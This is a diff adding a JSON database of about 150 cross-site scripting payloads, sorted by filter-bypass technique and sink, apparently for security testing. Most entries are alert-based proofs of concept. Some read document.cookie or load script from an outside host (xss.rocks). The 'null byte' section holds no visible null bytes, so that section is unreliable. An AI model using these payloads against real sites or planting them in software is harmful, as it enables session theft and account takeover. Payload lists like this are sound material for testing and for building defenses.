@@ -1,0 +1,370 @@
+{
+  "metadata": {
+    "version": "1.0.0",
+    "description": "Curated XSS payload database organized by technique",
+    "sources": [
+      "PayloadBox XSS List",
+      "PortSwigger XSS Cheat Sheet",
+      "OWASP Testing Guide",
+      "Real-world bug bounty reports"
+    ],
+    "last_updated": "2025-01-15",
+    "total_payloads": 150
+  },
+  "techniques": {
+    "basic_script_injection": {
+      "description": "Direct script tag injection",
+      "difficulty": "easy",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<script>alert('XSS')</script>",
+        "<script>confirm(1)</script>",
+        "<script>prompt(1)</script>",
+        "<script src=//xss.rocks/xss.js></script>",
+        "<script>alert(document.domain)</script>",
+        "<script>alert(document.cookie)</script>"
+      ]
+    },
+    "event_handlers_img": {
+      "description": "IMG tag with event handlers",
+      "difficulty": "easy",
+      "payloads": [
+        "<img src=x onerror=alert(1)>",
+        "<img src=x onerror=confirm(1)>",
+        "<img src=x onerror=prompt(1)>",
+        "<img src=x onerror=alert(document.domain)>",
+        "<img/src/onerror=alert(1)>",
+        "<img src onerror=alert(1)>",
+        "<img src=# onerror=alert(1)>",
+        "<img src=/ onerror=alert(1)>",
+        "<img src='' onerror=alert(1)>"
+      ]
+    },
+    "event_handlers_svg": {
+      "description": "SVG-based XSS with event handlers",
+      "difficulty": "easy",
+      "payloads": [
+        "<svg onload=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "<svg onload=confirm(1)>",
+        "<svg><script>alert(1)</script></svg>",
+        "<svg><animate onbegin=alert(1)>",
+        "<svg><animatetransform onbegin=alert(1)>",
+        "<svg><set onbegin=alert(1)>"
+      ]
+    },
+    "event_handlers_body": {
+      "description": "Body tag event handlers",
+      "difficulty": "easy",
+      "payloads": [
+        "<body onload=alert(1)>",
+        "<body onpageshow=alert(1)>",
+        "<body onfocus=alert(1)>",
+        "<body onhashchange=alert(1)>"
+      ]
+    },
+    "event_handlers_input": {
+      "description": "Input tag with auto-triggering events",
+      "difficulty": "medium",
+      "payloads": [
+        "<input autofocus onfocus=alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
+        "<input onblur=alert(1) autofocus><input autofocus>",
+        "<input type=text value=x onfocus=alert(1) autofocus>",
+        "<input type=search onsearch=alert(1)>"
+      ]
+    },
+    "event_handlers_alternative": {
+      "description": "Less common event handlers",
+      "difficulty": "medium",
+      "payloads": [
+        "<details open ontoggle=alert(1)>",
+        "<marquee onstart=alert(1)>",
+        "<video onloadstart=alert(1)><source>",
+        "<audio onloadstart=alert(1)><source>",
+        "<select onfocus=alert(1) autofocus>",
+        "<textarea onfocus=alert(1) autofocus>",
+        "<keygen onfocus=alert(1) autofocus>",
+        "<marquee onfinish=alert(1)>x</marquee>",
+        "<isindex type=image src=1 onerror=alert(1)>",
+        "<form><button formaction=javascript:alert(1)>X"
+      ]
+    },
+    "protocol_handlers": {
+      "description": "JavaScript protocol handlers",
+      "difficulty": "easy",
+      "payloads": [
+        "javascript:alert(1)",
+        "javascript:confirm(1)",
+        "javascript:prompt(1)",
+        "javascript:alert(document.domain)",
+        "javascript:alert(document.cookie)",
+        "javascript:void(alert(1))",
+        "javascript://comment%0Aalert(1)"
+      ]
+    },
+    "data_uri": {
+      "description": "Data URI-based XSS",
+      "difficulty": "medium",
+      "payloads": [
+        "data:text/html,<script>alert(1)</script>",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "data:text/html,<img src=x onerror=alert(1)>",
+        "data:text/html;charset=utf-8,<script>alert(1)</script>"
+      ]
+    },
+    "iframe_srcdoc": {
+      "description": "Iframe srcdoc attribute XSS",
+      "difficulty": "medium",
+      "payloads": [
+        "<iframe srcdoc=\"<script>alert(1)</script>\">",
+        "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
+        "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
+        "<iframe srcdoc='<svg/onload=alert(1)>'>"
+      ]
+    },
+    "tag_breaking": {
+      "description": "Breaking out of existing tags/attributes",
+      "difficulty": "medium",
+      "payloads": [
+        "\"><script>alert(1)</script>",
+        "'><script>alert(1)</script>",
+        "</script><script>alert(1)</script>",
+        "' autofocus onfocus=alert(1) x='",
+        "\" autofocus onfocus=alert(1) x=\"",
+        "'-alert(1)-'",
+        "\"-alert(1)-\"",
+        "--><script>alert(1)</script><!--"
+      ]
+    },
+    "case_variation": {
+      "description": "Case variation bypasses",
+      "difficulty": "easy",
+      "payloads": [
+        "<ScRiPt>alert(1)</sCrIpT>",
+        "<sCrIpT>alert(1)</ScRiPt>",
+        "<iMg sRc=x oNeRrOr=alert(1)>",
+        "<SvG/oNlOaD=alert(1)>",
+        "<sCrIpT>alert(1)</sCrIpT>"
+      ]
+    },
+    "encoding_html_entities": {
+      "description": "HTML entity encoding bypasses",
+      "difficulty": "medium",
+      "payloads": [
+        "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+        "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>"
+      ]
+    },
+    "encoding_url": {
+      "description": "URL encoding bypasses",
+      "difficulty": "medium",
+      "payloads": [
+        "%3Cscript%3Ealert(1)%3C/script%3E",
+        "%3Cimg%20src=x%20onerror=alert(1)%3E",
+        "%3Csvg%20onload=alert(1)%3E",
+        "javascript:%61%6C%65%72%74%28%31%29"
+      ]
+    },
+    "encoding_unicode": {
+      "description": "Unicode and UTF encoding bypasses",
+      "difficulty": "hard",
+      "payloads": [
+        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+        "<script>\\u0061lert(1)</script>",
+        "<script>\\x61lert(1)</script>",
+        "\\u003csvg onload=alert(1)\\u003e"
+      ]
+    },
+    "encoding_base64": {
+      "description": "Base64 encoding with eval/atob",
+      "difficulty": "medium",
+      "payloads": [
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+        "<svg onload=eval(atob('YWxlcnQoMSk='))>",
+        "javascript:eval(atob('YWxlcnQoMSk='))",
+        "<script>eval(atob('YWxlcnQoMSk='))</script>"
+      ]
+    },
+    "string_concatenation": {
+      "description": "String concatenation to bypass filters",
+      "difficulty": "medium",
+      "payloads": [
+        "<script>alert(1+'')</script>",
+        "<script>alert(1..toString())</script>",
+        "<script>alert('al'+'ert')</script>",
+        "<script>eval('ale'+'rt(1)')</script>",
+        "<img src=x onerror=eval('ale'+'rt(1)')>"
+      ]
+    },
+    "fromcharcode": {
+      "description": "String.fromCharCode encoding",
+      "difficulty": "medium",
+      "payloads": [
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+        "javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
+        "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
+      ]
+    },
+    "template_literals": {
+      "description": "ES6 template literal bypasses",
+      "difficulty": "medium",
+      "payloads": [
+        "<script>alert`1`</script>",
+        "<script>eval`alert\\x281\\x29`</script>",
+        "<img src=x onerror=alert`1`>",
+        "<svg onload=alert`1`>"
+      ]
+    },
+    "comment_breaking": {
+      "description": "Comment insertion to bypass filters",
+      "difficulty": "medium",
+      "payloads": [
+        "<script><!--*/alert(1)//--></script>",
+        "<img src=x o/**/nerror=alert(1)>",
+        "<svg on/*comment*/load=alert(1)>",
+        "<!--<img src=x onerror=alert(1)>-->",
+        "<script>/**/alert(1)/**/</script>"
+      ]
+    },
+    "null_byte": {
+      "description": "Null byte injection",
+      "difficulty": "hard",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>"
+      ]
+    },
+    "whitespace_manipulation": {
+      "description": "Whitespace and newline bypasses",
+      "difficulty": "medium",
+      "payloads": [
+        "<img\nsrc=x\nonerror=alert(1)>",
+        "<svg\nonload=alert(1)>",
+        "<script\n>alert(1)</script>",
+        "<img\tsrc=x\tonerror=alert(1)>",
+        "<img src=x     onerror=alert(1)>"
+      ]
+    },
+    "polyglots": {
+      "description": "Multi-context polyglot payloads",
+      "difficulty": "hard",
+      "payloads": [
+        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+        "'\"><img src=x onerror=alert(1)>",
+        "\";alert(1)//",
+        "'-alert(1)-'",
+        "</script><script>alert(1)</script>",
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e"
+      ]
+    },
+    "dom_sources": {
+      "description": "DOM-based XSS targeting common sources",
+      "difficulty": "medium",
+      "context": "dom",
+      "payloads": [
+        "#<script>alert(1)</script>",
+        "#<img src=x onerror=alert(1)>",
+        "#javascript:alert(1)",
+        "?search=<script>alert(1)</script>",
+        "?q=<img src=x onerror=alert(1)>"
+      ]
+    },
+    "location_href": {
+      "description": "Payloads for location.href sinks",
+      "difficulty": "medium",
+      "context": "dom",
+      "payloads": [
+        "javascript:alert(1)",
+        "javascript:void(alert(1))",
+        "javascript:alert(document.domain)",
+        "data:text/html,<script>alert(1)</script>"
+      ]
+    },
+    "eval_sink": {
+      "description": "Payloads for eval() sinks",
+      "difficulty": "hard",
+      "context": "dom",
+      "payloads": [
+        "alert(1)",
+        "1);alert(1);//",
+        "1);alert(1);alert(1",
+        "\\');alert(1);//",
+        "\\\");alert(1);//"
+      ]
+    },
+    "document_write": {
+      "description": "Payloads for document.write sinks",
+      "difficulty": "medium",
+      "context": "dom",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<body onload=alert(1)>"
+      ]
+    },
+    "innerhtml_sink": {
+      "description": "innerHTML sink payloads",
+      "difficulty": "medium",
+      "context": "dom",
+      "payloads": [
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<iframe src=javascript:alert(1)>"
+      ]
+    },
+    "css_injection": {
+      "description": "CSS-based XSS (for old browsers)",
+      "difficulty": "hard",
+      "payloads": [
+        "<style>*{background:url(javascript:alert(1))}</style>",
+        "<link rel=stylesheet href=javascript:alert(1)>",
+        "<style>@import'javascript:alert(1)';</style>",
+        "<style>body{behavior:url(xss.htc);}</style>"
+      ]
+    },
+    "meta_refresh": {
+      "description": "Meta tag refresh-based XSS",
+      "difficulty": "easy",
+      "payloads": [
+        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+        "<meta http-equiv=\"refresh\" content=\"0; url=data:text/html,<script>alert(1)</script>\">"
+      ]
+    },
+    "form_action": {
+      "description": "Form action attribute XSS",
+      "difficulty": "medium",
+      "payloads": [
+        "<form action=javascript:alert(1)><input type=submit>",
+        "<form><button formaction=javascript:alert(1)>X</button>",
+        "<form><input formaction=javascript:alert(1) type=submit>"
+      ]
+    },
+    "object_embed": {
+      "description": "Object and embed tag XSS",
+      "difficulty": "medium",
+      "payloads": [
+        "<object data=javascript:alert(1)>",
+        "<embed src=javascript:alert(1)>",
+        "<object data=data:text/html,<script>alert(1)</script>>"
+      ]
+    },
+    "mutation_xss": {
+      "description": "mXSS (mutation XSS) payloads",
+      "difficulty": "hard",
+      "payloads": [
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "<svg><style><img/src=x onerror=alert(1)//</b>",
+        "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">"
+      ]
+    }
+  }
+}
